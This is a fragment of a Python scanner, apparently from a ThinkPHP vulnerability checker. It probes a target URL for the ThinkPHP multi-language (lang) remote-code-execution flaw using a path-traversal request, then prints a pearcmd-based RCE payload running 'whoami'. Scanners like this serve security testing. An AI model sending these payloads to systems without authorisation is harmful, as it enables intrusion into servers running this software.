...
class Check:
    ...
    def check_lang_rce(self):
        try:
            checkresult = {}
            payload1 = "/index.php?lang=iceberg"
            payload2 = "/index.php?lang=../../../../../public/index"
            poc_url1 = self.url + payload1
            poc_url2 = self.url + payload2
            res = requests.get(poc_url1, headers=headers, timeout=10, verify=False)
            if "iceberg" in str(res.headers):
                res = requests.get(poc_url2, headers=headers, timeout=10, verify=False)
                if res.status_code == 500:
                    self.poc = "/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=whoami"
                    self.poc_method = "tp_lang_rce"
                    checkresult[self.poc_method] = self.poc
                    self.check_poc()
                else:
                    pass
            ...
            if checkresult:
                ...
                print("[-] {0} 不存在thinkphp_lang多语言rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")
            print(e)
    ...
    def check_poc(self):
        ...
        elif self.poc_method == "tp_lang_rce":
            print(Fore.GREEN + "[+] {0} 存在thinkphp_lang多语言rce漏洞\npayload: {1}".format(self.url, self.poc))
        else:
            pass